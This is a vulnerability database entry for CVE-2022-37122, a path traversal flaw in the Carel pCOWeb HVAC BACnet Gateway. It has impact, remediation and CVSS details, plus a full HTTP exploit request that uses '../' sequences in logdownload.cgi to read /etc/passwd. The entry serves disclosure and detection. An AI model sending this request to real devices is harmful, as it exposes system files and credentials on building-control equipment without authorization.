---
layout: "post"
cve_id: "CVE-2022-37122"
title: "Carel pCOWeb HVAC BACnet Gateway 2.1.0 - Path Traversal"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-37122.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-37122.yaml"
author: "gy741"
severity: "high"
impact: "Unauthenticated attackers can read arbitrary files from the Carel pCOWeb HVAC BACnet Gateway through directory traversal in the logdownload.cgi file parameter, potentially exposing sensitive configuration files, credentials, and HVAC system data.
"
remediation: "Update Carel pCOWeb HVAC BACnet Gateway to a version later than 2.1.0 that properly validates file paths in logdownload.cgi.
"
reference:
  - "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5709.php"
  - "https://www.zeroscience.mk/codes/carelpco_dir.txt"
  - "https://packetstormsecurity.com/files/167684/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-37122"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 'cvss-score': 7.5, 'cve-id': 'CVE-2022-37122', 'cwe-id': 'CWE-22', 'epss-score': 0.58497, 'epss-percentile': 0.98123}"
metadata: "{'max-request': 1, 'vendor': 'carel', 'product': 'pcoweb_hvac_bacnet_gateway'}"
tags:
  - "cve"
  - "cve2022"
  - "carel"
  - "lfi"
  - "traversal"
  - "unauth"
  - "bacnet"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Carel pCOWeb HVAC BACnet Gateway 2.1.0 contains an unauthenticated arbitrary file disclosure caused by improper verification of the 'file' GET parameter in logdownload.cgi, letting attackers disclose sensitive files via directory traversal, exploit requires no authentication.


## üåê HTTP Request
```nohighlight
GET /usr-cgi/logdownload.cgi?file=../../../../../../../../etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

